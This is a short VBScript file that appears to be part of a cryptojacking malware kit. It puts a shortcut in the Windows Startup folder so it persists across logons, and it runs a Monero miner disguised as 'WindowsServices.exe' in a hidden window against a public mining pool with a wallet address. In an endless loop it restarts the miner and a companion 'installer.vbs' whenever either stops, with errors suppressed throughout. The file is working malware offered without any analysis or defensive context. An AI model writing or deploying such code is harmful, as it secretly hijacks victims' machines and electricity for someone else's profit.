on error resume next
Dim ws, sParams, strPath, objws, objFile, strFolder, startupPath, MyScript, objWinMgmt, colProcess, vaprocess, miner
Set ws = WScript.CreateObject("WScript.Shell")
sParams = "-o stratum+tcp://xmr.crypto-pool.fr:3333 -u 42Damq6yzG5JteZ3wxZNkuKj6onDw9T27QoPxeBpv8ira5s7cZLS2Yz7KqwRD6ok4bjYp6PWkAiJMKjuQXo3wUh8PJ8JFwE -p x -lowcpu 2 -dbg -1"

Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")


strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
strPath = strFolder & "\"
startupPath = ws.SpecialFolders("startup")

miner = Chr(34) & strPath & "WindowsServices.exe" & Chr(34) & sParams

'ws.Run miner , 0


MyScript = "helper.vbs"





While True
If (not objws.fileexists(startupPath & "\helper.lnk")) then
	Set link = ws.CreateShortcut(startupPath & "\helper.lnk")
	link.Description = "helper"
	link.TargetPath = strPath & "helper.vbs"
	link.WorkingDirectory = strPath
	link.Save
End If

Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

call procheck(colProcess, "installer.vbs")

Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%WindowsServices.exe%'")

if colProcess.count = 0 then
	ws.Run miner, 0
end if
WScript.Sleep 5000
Wend



sub procheck(checkme, procname)

For Each objProcess In checkme
	vaprocess = objProcess.CommandLine
	
		if instr(vaprocess, procname) then
			Exit sub
		End if
	
Next

ws.Run strPath & procname
end sub

